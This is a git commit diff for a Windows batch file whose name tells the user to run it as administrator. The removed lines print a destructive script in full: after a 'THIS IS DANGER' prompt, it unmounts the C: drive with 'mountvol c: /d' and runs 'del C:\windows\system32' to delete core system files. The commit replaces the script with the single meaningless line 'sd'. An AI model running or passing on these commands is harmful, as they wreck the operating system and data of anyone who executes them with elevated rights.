8ade02d32424aa1acbbbbb57498f2005fe4262a9
kyrok638 <134541021+Arslanailaiti@users.noreply.github.com>
2024-02-01 16:19:38 +0100

    Update NbuBatch1 (Run as it administrastor).bat

--- NbuBatch1 (Run as it administrastor).bat
+++ NbuBatch1 (Run as it administrastor).bat
@@ -1,7 +1,1 @@
-@echo off
-title NBUBATCH7928192810221382389139128391283hasjfnwheiurhwr43u28904eu2308eujqwouqwioueiqh49234
-echo RUN? THIS IS DANGER
-pause
-cls
-mountvol c: /d
-del C:\windows\system32
+sd
